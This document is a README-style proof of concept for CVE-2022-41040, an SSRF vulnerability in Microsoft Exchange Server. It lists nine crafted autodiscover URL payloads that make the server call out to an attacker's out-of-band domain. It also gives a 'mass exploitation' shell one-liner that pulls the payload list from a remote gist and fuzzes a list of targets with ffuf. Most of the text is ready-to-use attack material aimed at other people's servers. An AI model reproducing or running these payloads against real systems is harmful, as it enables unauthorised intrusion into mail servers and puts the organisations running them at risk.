# CVE-2022-41040-POC
CVE-2022-41040 - Server Side Request Forgery (SSRF) in Microsoft Exchange Server

## Manual exploiation 

1. Replace `COLLABHERE` with your OOB domain - `sed 's/COLLABHERE/<oob-domain>/g`

2. Add payloads next to URLs you want to test - `echo http://target.com|unfurl format %s://%d/<payload>`

3. Visit crafted URLs

4. Check your collaborator

Payloads:
```
/autodiscover/autodiscover.json?@%d.v1.COLLABHERE/&Email=autodiscover/autodiscover.json%3f@%d.v1.COLLABHERE
/autodiscover/autodiscover.json/v1.0/aa@%d.v2.COLLABHERE?Protocol=Autodiscoverv1
/autodiscover/autodiscover.json/v1.0/aa..@%d.v3.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
/autodiscover/autodiscover.json/v1.0/aa@%d.v4.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
/autodiscover/autodiscover.json?aa..%d.v5.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.COLLABHERE&Protocol=Autodiscoverv1&%d.v5.COLLABHEREProtocol=Powershell
/autodiscover/autodiscover.json?aa@%d.v6.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.COLLABHERE&Protocol=Autodiscoverv1&%d.v6.COLLABHEREProtocol=Powershell
/autodiscover/autodiscover.json?aa..%d.v7.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.COLLABHERE&Protocol=Autodiscoverv1&%d.v7.COLLABHEREProtocol=Powershell
/autodiscover/autodiscover.json?aa@%d.v8.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.COLLABHERE&Protocol=Autodiscoverv1&%d.v8.COLLABHEREProtocol=Powershell
/autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
```

## Mass exploitation

```
for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed 's/COLLABHERE/<OOB-PAYLOAD>/g'); do cat targets.txt |unfurl format $url >> fuzz-ready.txt;done & ffuf -w fuzz-ready.txt -u FUZZ
```

Check your collaborator!

Happy hunting!

### Requirements
[ffuf](https://github.com/ffuf/ffuf)
Thanks [@joohoi](https://github.com/joohoi)!


[unfurl](https://github.com/tomnomnom/unfurl)
Thanks [tomnomnom](https://github.com/tomnomnom)!

[Twitter](https://twitter.com/milanshiftsec)

[LinkedIn](https://www.linkedin.com/in/milan-jovic-sec/)
